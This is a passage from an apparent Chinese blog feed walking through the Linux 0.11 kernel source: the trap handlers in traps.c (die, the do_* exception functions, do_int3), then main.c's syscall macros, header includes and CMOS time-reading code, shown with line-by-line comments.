class="meta">__res;&#125;)</span></span><br></pre></td></tr></table></figure><p>然后定义一个 die 函数，用于输出中断/异常的信息，其三个参数分别为错误名称的字符串指针，出错而被中断的程序在栈中信息的指针（第一张图中的 esp0）及错误码。printk 定义在 kernel/printk.c 中，内核态下不能使用 printf，因其会改变 fs 的值，所以新定义了一个 printk 先将 fs 的值保存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">char</span> * str,<span class="keyword">long</span> esp_ptr,<span class="keyword">long</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">long</span> * esp = (<span class="keyword">long</span> *) esp_ptr;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">printk(<span class="string">&quot;%s: %04x\n\r&quot;</span>,str,nr&amp;<span class="number">0xffff</span>);<span class="comment">// 打印错误名及错误码低 2 字节</span></span><br><span class="line">printk(<span class="string">&quot;EIP:\t%04x:%p\nEFLAGS:\t%p\nESP:\t%04x:%p\n&quot;</span>,</span><br><span class="line">esp[<span class="number">1</span>],esp[<span class="number">0</span>],esp[<span class="number">2</span>],esp[<span class="number">4</span>],esp[<span class="number">3</span>]);<span class="comment">// 打印用户任务的 CS:EIP EFLAGS SS:ESP</span></span><br><span class="line">printk(<span class="string">&quot;fs: %04x\n&quot;</span>,_fs());<span class="comment">// 打印 fs 的值，下一行打印段基址及段限长</span></span><br><span class="line">printk(<span class="string">&quot;base: %p, limit: %p\n&quot;</span>,get_base(current-&gt;ldt[<span class="number">1</span>]),get_limit(<span class="number">0x17</span>));</span><br><span class="line"><span class="keyword">if</span> (esp[<span class="number">4</span>] == <span class="number">0x17</span>) &#123;<span class="comment">// 如果 ss 指向用户栈，则打印用户栈中 16 个字节的数据</span></span><br><span class="line">printk(<span class="string">&quot;Stack: &quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">printk(<span class="string">&quot;%p &quot;</span>,get_seg_long(<span class="number">0x17</span>,i+(<span class="keyword">long</span> *)esp[<span class="number">3</span>]));</span><br><span class="line">printk(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">str(i);<span class="comment">// 取当前任务号存放在 i 中(include/linux/sched.h)</span></span><br><span class="line">printk(<span class="string">&quot;Pid: %d, process nr: %d\n\r&quot;</span>,current-&gt;pid,<span class="number">0xffff</span> &amp; i);<span class="comment">// 输出进程号及任务号</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)<span class="comment">// 输出 CS:EIP 处 10 字节的内容</span></span><br><span class="line">printk(<span class="string">&quot;%02x &quot;</span>,<span class="number">0xff</span> &amp; get_seg_byte(esp[<span class="number">1</span>],(i+(<span class="keyword">char</span> *)esp[<span class="number">0</span>])));</span><br><span class="line">printk(<span class="string">&quot;\n\r&quot;</span>);</span><br><span class="line">do_exit(<span class="number">11</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>紧接着定义 asm.s 中调用的那些 do 开头的中断处理程序，这些处理程序都通过 die 来输出信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 87</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_double_fault</span><span class="params">(<span class="keyword">long</span> esp, <span class="keyword">long</span> error_code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">die(<span class="string">&quot;double fault&quot;</span>,esp,error_code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_general_protection</span><span class="params">(<span class="keyword">long</span> esp, <span class="keyword">long</span> error_code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">die(<span class="string">&quot;general protection&quot;</span>,esp,error_code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_divide_error</span><span class="params">(<span class="keyword">long</span> esp, <span class="keyword">long</span> error_code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">die(<span class="string">&quot;divide error&quot;</span>,esp,error_code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 119</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_nmi</span><span class="params">(<span class="keyword">long</span> esp, <span class="keyword">long</span> error_code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">die(<span class="string">&quot;nmi&quot;</span>,esp,error_code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_debug</span><span class="params">(<span class="keyword">long</span> esp, <span class="keyword">long</span> error_code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">die(<span class="string">&quot;debug&quot;</span>,esp,error_code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_overflow</span><span class="params">(<span class="keyword">long</span> esp, <span class="keyword">long</span> error_code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">die(<span class="string">&quot;overflow&quot;</span>,esp,error_code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bounds</span><span class="params">(<span class="keyword">long</span> esp, <span class="keyword">long</span> error_code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">die(<span class="string">&quot;bounds&quot;</span>,esp,error_code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_invalid_op</span><span class="params">(<span class="keyword">long</span> esp, <span class="keyword">long</span> error_code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">die(<span class="string">&quot;invalid operand&quot;</span>,esp,error_code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_device_not_available</span><span class="params">(<span class="keyword">long</span> esp, <span class="keyword">long</span> error_code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">die(<span class="string">&quot;device not available&quot;</span>,esp,error_code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_coprocessor_segment_overrun</span><span class="params">(<span class="keyword">long</span> esp, <span class="keyword">long</span> error_code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">die(<span class="string">&quot;coprocessor segment overrun&quot;</span>,esp,error_code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_invalid_TSS</span><span class="params">(<span class="keyword">long</span> esp,<span class="keyword">long</span> error_code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">die(<span class="string">&quot;invalid TSS&quot;</span>,esp,error_code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_segment_not_present</span><span class="params">(<span class="keyword">long</span> esp,<span class="keyword">long</span> error_code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">die(<span class="string">&quot;segment not present&quot;</span>,esp,error_code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_stack_segment</span><span class="params">(<span class="keyword">long</span> esp,<span class="keyword">long</span> error_code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">die(<span class="string">&quot;stack segment&quot;</span>,esp,error_code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_coprocessor_error</span><span class="params">(<span class="keyword">long</span> esp, <span class="keyword">long</span> error_code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (last_task_used_math != current)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">die(<span class="string">&quot;coprocessor error&quot;</span>,esp,error_code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_reserved</span><span class="params">(<span class="keyword">long</span> esp, <span class="keyword">long</span> error_code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">die(<span class="string">&quot;reserved (15,17-47) error&quot;</span>,esp,error_code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中有一个例外，那就是 int 3 的处理程序，它的参数是进入中断后压入栈中的寄存器值，作用是输出寄存器值等信息方便调试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_int3</span><span class="params">(<span class="keyword">long</span> * esp, <span class="keyword">long</span> error_code,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">long</span> fs,<span class="keyword">long</span> es,<span class="keyword">long</span> ds,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">long</span> ebp,<span class="keyword">long</span> esi,<span class="keyword">long</span> edi,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">long</span> edx,<span class="keyword">long</span> ecx,<span class="keyword">long</span> ebx,<span class="keyword">long</span> eax)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> tr;</span><br><span class="line"></span><br><span class="line">__asm__(<span class="string">&quot;str %%ax&quot;</span>:<span class="string">&quot;=a&quot;</span> (tr):<span class="string">&quot;0&quot;</span> (<span class="number">0</span>));<span class="comment">// tr = ax = 任务寄存器 TR 的值</span></span><br><span class="line">printk(<span class="string">&quot;eax\t\tebx\t\tecx\t\tedx\n\r%8x\t%8x\t%8x\t%8x\n\r&quot;</span>,</span><br><span class="line">eax,ebx,ecx,edx);</span><br><span class="line">printk(<span class="string">&quot;esi\t\tedi\t\tebp\t\tesp\n\r%8x\t%8x\t%8x\t%8x\n\r&quot;</span>,</span><br><span class="line">esi,edi,ebp,(<span class="keyword">long</span>) esp);</span><br><span class="line">printk(<span class="string">&quot;\n\rds\tes\tfs\ttr\n\r%4x\t%4x\t%4x\t%4x\n\r&quot;</span>,</span><br><span class="line">ds,es,fs,tr);</span><br><span class="line">printk(<span class="string">&quot;EIP: %8x   CS: %4x  EFLAGS: %8x\n\r&quot;</span>,esp[<span class="number">0</span>],esp[<span class="number">1</span>],esp[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> Linux0.11 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核源码阅读--初始化主程序</title>
      <link href="/2020/03/26/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%BB%E7%A8%8B%E5%BA%8F/"/>
      <url>/2020/03/26/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%BB%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="main-c-功能描述"><a href="#main-c-功能描述" class="headerlink" title="main.c 功能描述"></a>main.c 功能描述</h2><p>之前 setup 在 0x90000 ~ 0x901FF 保存了一些重要的机器参数，其中包括主内存区的开始地址，内存大小和作为高速缓冲区内存的末端地址，如果 Makefile 中还定义了 RAMDISK 虚拟盘，则主内存区还会减小。</p><p>高速缓冲是用于供磁盘等块设备临时存放数据的地方，以 1KB 为一个数据块单位，其中包含了显存及其 BIOS 占用的区域。现在 main.c 将会用这些参数来划分内存区域</p><p><img src="../img/m1.png" alt="内存划分"></p><p>之后调用一堆初始化函数对内存、陷阱门、块设备、字符设备、tty、时间、进程调度、缓冲区、硬盘、软驱进行初始化，并完成进程 0 的创建，从内核态切换为用户态。</p><p>此时第一次调用 fork 函数创建用于运行 init 函数的子进程 1，init 函数主要作用为</p><ul><li>安装根文件系统</li><li>显示系统信息</li><li>执行资源配置文件</li><li>执行登录 shell 程序</li></ul><p>流程图如下：</p><p><img src="../img/m2.png" alt="内存划分"></p><br><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>*.h 头文件没有指明路径默认在 include 目录下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __LIBRARY__<span class="comment">// 定义了该符号表示会包含系统调用号及一些宏定义如 syscall0 等</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span><span class="comment">// 定义了各种符号常数与类型，声明了函数</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span><span class="comment">// 时间类型头文件</span></span></span><br></pre></td></tr></table></figure><p>__always_inline 与 syscall 等在 include/unistd.h 中都有定义，_syscall 后面的数字表示定义的函数有几个参数，括号中的前两个参数为函数返回值类型及函数名，之后的每两个参数代表该函数参数类型及参数名</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 24</span></span><br><span class="line">__always_inline _syscall0(<span class="keyword">int</span>,fork)</span><br><span class="line">__always_inline _syscall0(<span class="keyword">int</span>,pause)</span><br><span class="line">__always_inline _syscall1(<span class="keyword">int</span>,setup,<span class="keyword">void</span> *,BIOS)</span><br><span class="line">__always_inline _syscall0(<span class="keyword">int</span>,sync)</span><br></pre></td></tr></table></figure><p>比如 _syscall1(int,setup,void *,BIOS) 表示定义了 int setup(void *BIOS) 这么一个函数，具体代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// include/unistd.h Line 267</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __always_inline inline __attribute__((always_inline))<span class="comment">// 该函数需要内联处理</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 60 取部分用到的常数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fork2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pause29</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setup0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sync36</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Line 147</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _syscall0(type,name) \</span></span><br><span class="line"><span class="meta">type name(void) \</span></span><br><span class="line"><span class="meta">&#123; \</span></span><br><span class="line"><span class="meta">long __res; \</span></span><br><span class="line"><span class="meta">__asm__ volatile (<span class="meta-string">&quot;int $0x80&quot;</span> \</span></span><br><span class="line"><span class="meta">: <span class="meta-string">&quot;=a&quot;</span> (__res) \<span class="comment">// 将结果从 eax 寄存器赋值给变量 __res</span></span></span><br><span class="line">: <span class="string">&quot;0&quot;</span> (__NR_#<span class="meta">#name)); \<span class="comment">// &#x27;0&#x27; 表示使用与第 0 条操作表达式相同的寄存器，即 eax = __NR_XXX</span></span></span><br><span class="line"><span class="keyword">if</span> (__res &gt;= <span class="number">0</span>) \</span><br><span class="line"><span class="keyword">return</span> (type) __res; \</span><br><span class="line">errno = -__res; \</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>; \</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _syscall1(type,name,atype,a) \</span></span><br><span class="line"><span class="meta">type name(atype a) \</span></span><br><span class="line"><span class="meta">&#123; \</span></span><br><span class="line"><span class="meta">long __res; \</span></span><br><span class="line"><span class="meta">__asm__ volatile (<span class="meta-string">&quot;int $0x80&quot;</span> \</span></span><br><span class="line"><span class="meta">: <span class="meta-string">&quot;=a&quot;</span> (__res) \</span></span><br><span class="line"><span class="meta">: <span class="meta-string">&quot;0&quot;</span> (__NR_##name),<span class="meta-string">&quot;b&quot;</span> ((long)(a))); \</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">if</span> (__res &gt;= 0) \</span></span><br><span class="line"><span class="meta">return (type) __res; \</span></span><br><span class="line"><span class="meta">errno = -__res; \</span></span><br><span class="line"><span class="meta">return -1; \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><p>对于 gcc AT&amp;T 内嵌汇编不太熟悉的话，可以参考这篇 <a href="https://blog.csdn.net/xsc_c/article/details/17061407">csdn</a> 博文。以 _syscall0(int,fork) 为例，_syscall0(int,fork) 后产生了这么一个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fork</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">long</span> __res;</span><br><span class="line"><span class="function">__asm__ <span class="title">volatile</span> <span class="params">(<span class="string">&quot;int $0x80&quot;</span> : <span class="string">&quot;=a&quot;</span> (__res) : <span class="string">&quot;0&quot;</span> (__NR_fork))</span></span>;</span><br><span class="line"><span class="keyword">if</span> (__res &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">int</span>) __res;</span><br><span class="line">errno = -__res;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后包含一堆头文件，引用一些初始化函数，定义一些常量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 29</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tty.h&gt;</span><span class="comment">// 定义有关 tty_ip，串行通信方面的常数等</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span><span class="comment">// 进程调度程序头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/head.h&gt;</span><span class="comment">// 定义了段描述符的结构等</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/system.h&gt;</span><span class="comment">// 以宏的形式定义了许多有关设置或修改描述符/中断门等的嵌入式汇编子程序</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt;</span><span class="comment">// 定义了对 IO 端口的操作函数</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span><span class="comment">// 标准定义头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span><span class="comment">// 标准参数头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span><span class="comment">// 文件控制头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span><span class="comment">// 定义了基本的系统数据类型</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span><span class="comment">// 文件系统头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> printbuf[<span class="number">1024</span>];<span class="comment">// 内核显示信息的缓存</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">vsprintf</span><span class="params">()</span></span>;<span class="comment">// vsprintf.c</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span></span>;<span class="comment">// 就在本程序中</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">blk_dev_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;<span class="comment">// 块设备初始化 blk_drv/ll_rw_blk.c</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">chr_dev_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;<span class="comment">// 字符设备初始化 chr_drv/tty_io.c</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">hd_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;<span class="comment">// 硬盘初始化 blk_drv/hd.c</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">floppy_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;<span class="comment">// 软驱初始化 blk_drv/floppy.c</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">mem_init</span><span class="params">(<span class="keyword">long</span> start, <span class="keyword">long</span> end)</span></span>;<span class="comment">// 内存管理初始化 mm/memory.c</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">long</span> <span class="title">rd_init</span><span class="params">(<span class="keyword">long</span> mem_start, <span class="keyword">int</span> length)</span></span>;<span class="comment">// 虚拟盘初始化 blk_drv/ramdisk</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">long</span> <span class="title">kernel_mktime</span><span class="params">(struct tm * tm)</span></span>;<span class="comment">// 系统开机时间 kernel/mktime.c</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">long</span> startup_time;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXT_MEM_K (*(unsigned short *)0x90002)<span class="comment">// 1MB 后扩展内存的大小（KB）</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVE_INFO (*(struct drive_info *)0x90080)<span class="comment">// 硬盘参数表</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ORIG_ROOT_DEV (*(unsigned short *)0x901FC)<span class="comment">// 根文件系统所在设备号</span></span></span><br></pre></td></tr></table></figure><p>接下来定义读取 CMOS 时钟信息的宏及 time_init 函数，从 CMOS 中读出的信息都是 BCD 码的形式，用 4 bits（半个字节）表示一个 10 进制数。于是定义一个 BCD_TO_BIN 的宏，val&amp;15 取 10 进制个位，val&gt;&gt;4 取 10 进制十位，乘 10 与个位相加得到实际的十进制对应的二进制数值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 69</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMOS_READ(addr) (&#123; \</span></span><br><span class="line"><span class="meta">outb_p(0x80|addr,0x70); \<span class="comment">// 向 0x70 端口输出要读取 CMOS 的内存位置</span></span></span><br><span class="line">inb_p(<span class="number">0x71</span>); \<span class="comment">// 从 0x71 读取一个字节</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BCD_TO_BIN(val) ((val)=((val)&amp;15) + ((val)&gt;&gt;4)*10)<span class="comment">// BCD 码转二进制数值</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">time_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tm</span> <span class="title">time</span>;</span><span class="comment">// tm 结构定义在 time.h 中</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">time.tm_sec = CMOS_READ(<span class="number">0</span>);<span class="comment">// 秒数</span></span><br><span class="line">time.tm_min = CMOS_READ(<span class="number">2</span>);<span class="comment">// 分钟</span></span><br><span class="line">time.tm_hour = CMOS_READ(<span class="number">4</span>);<span class="comment">// 小时</span></span><br><span class="line">time.tm_mday = CMOS_READ(<span class="number">7</span>);<span class="comment">// 一个月中的日期</span></span><br><span class="line">time.tm_mon = CMOS_READ(<span class="number">8</span>);<span class="comment">// 月份</span></span><br><span class="line">time.tm_year = CMOS_READ(<span class="number">9</span>);<span class="comment">// 年份</span></span><br><span class="line">&#125; <span class="keyword">while</span> (time.tm_sec != CMOS_READ(<span class="number">0</span>));<span class="comment">// do-while 